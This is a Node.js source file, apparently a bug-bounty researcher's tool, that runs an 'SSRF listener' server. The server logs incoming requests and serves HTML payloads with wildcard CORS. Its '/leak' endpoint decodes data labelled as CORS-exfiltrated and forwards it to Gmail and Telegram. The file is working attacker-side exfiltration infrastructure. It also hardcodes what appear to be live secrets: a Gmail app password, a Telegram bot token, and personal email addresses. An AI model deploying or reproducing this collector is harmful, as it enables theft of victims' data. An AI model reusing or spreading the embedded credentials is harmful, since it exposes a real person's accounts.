const http = require('http');
const path = require('path');
const fs = require('fs');
const nodemailer = require('nodemailer');
const fetch = require('node-fetch');

// === CONFIGURATION ===

const gmailUser = 'mzeroaccess@gmail.com';
const gmailPass = 'pext txcx xmsv ytbd';

const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: gmailUser,
        pass: gmailPass
    }
});

const telegramBotToken = '7610095737:AAFDUe27WjrY3FJKxHCX5F2Tihd-6YP08sA';
const telegramChatId = '599961631';

function sendTelegramMessage(message) {
    const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
    const data = {
        chat_id: telegramChatId,
        text: message
    };

    fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
    })
    .then(res => res.json())
    .then(json => {
        if (json.ok) {
            console.log('✅ Telegram message sent');
        } else {
            console.error('❌ Telegram send error:', json);
        }
    })
    .catch(err => console.error('❌ Fetch error:', err));
}

// === SSRF Listener Server ===

const server = http.createServer((req, res) => {
    const now = new Date().toISOString();
    console.log(`\n📥 ${req.method} Request received ---------------------------------------------------------------`);

    const ipChain = [
        req.headers['x-forwarded-for'],
        req.headers['cf-connecting-ip'],
        req.headers['true-client-ip'],
        req.headers['x-real-ip'],
        req.socket.remoteAddress
    ].filter(Boolean);

    console.log(`➡️  IP Chain: ${ipChain.join(' → ')}`);
    console.log(`➡️  URL: ${req.url}`);
    console.log(`🧠 Headers:`, req.headers);

    let bodyChunks = [];
    req.on('data', chunk => bodyChunks.push(chunk));
    req.on('end', () => {
        let rawBody = Buffer.concat(bodyChunks).toString();
        let parsedBody = rawBody;

        if (req.headers['content-type'] && req.headers['content-type'].includes('application/json')) {
            try {
                parsedBody = JSON.stringify(JSON.parse(rawBody), null, 2);
                console.log(`📦 JSON Body:\n${parsedBody}`);
            } catch (err) {
                console.error('❌ Error parsing JSON body:', err.message);
                parsedBody = rawBody;
            }
        } else {
            console.log(`📦 Body:\n${rawBody}`);
        }

        // === CORS PoC leak handling ===
        if (req.url === '/leak' && req.method === 'POST') {
            let data = null;

            try {
                const jsonBody = JSON.parse(rawBody);
                data = jsonBody.data;
            } catch (err) {
                console.error("❌ Couldn't parse CORS exfiltrated JSON:", err);
            }

            if (data) {
                const decoded = Buffer.from(data, 'base64').toString('utf-8');
                console.log("🔥 CORS Exfiltrated Data:\n", decoded);

                const leakDetails = `🧠 CORS Exploit Exfiltrated Data:\n\n${decoded}`;

                transporter.sendMail({
                    from: gmailUser,
                    to: gmailUser,
                    subject: '🔥 CORS PoC Triggered!',
                    text: leakDetails
                }, (error, info) => {
                    if (error) console.error('❌ Error sending CORS email:', error);
                    else console.log('✅ CORS mail sent:', info.response);
                });

                sendTelegramMessage(leakDetails);
            }

            res.writeHead(200, { 'Content-Type': 'text/plain' });
            res.end("✅ CORS data received.");
            return;
        }

        // === Normal Request Logging and Alerts ===
        const fullRequestDetails = `⚡ New Request at ${now}!\n\n` +
            `➡️ IP Chain: ${ipChain.join(' → ')}\n` +
            `➡️ URL: ${req.url}\n\n` +
            `🧠 Headers:\n${JSON.stringify(req.headers, null, 2)}\n\n` +
            `📦 Body:\n${parsedBody || 'No Body'}`;

        transporter.sendMail({
            from: gmailUser,
            to: gmailUser,
            subject: '⚡ SSRF Request Detected!',
            text: fullRequestDetails
        }, (error, info) => {
            if (error) console.error('❌ Error sending mail:', error);
            else console.log('✅ Mail sent:', info.response);
        });

        sendTelegramMessage(fullRequestDetails);

        // Serve payloads if exists
        res.setHeader('Access-Control-Allow-Origin', '*');

        const safePath = path.normalize(path.join(__dirname, 'public', req.url));
        if (safePath.startsWith(path.join(__dirname, 'public')) && req.url.startsWith('/payload/')) {
            fs.readFile(safePath, (err, content) => {
                if (err) {
                    res.writeHead(404, { 'Content-Type': 'text/plain' });
                    res.end('File Not Found');
                    return;
                }
                res.writeHead(200, { 'Content-Type': 'text/html' });
                res.end(content);
            });
        } else {
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ message: 'Active hackerone-theoneabove manuelxantony@gmail.com mzeroaccess@gmail.com'}));
        }
    });
});

const PORT = 4545;
server.listen(PORT, () => {
    console.log(`🚀 SSRF listener running at http://localhost:${PORT}`);
});
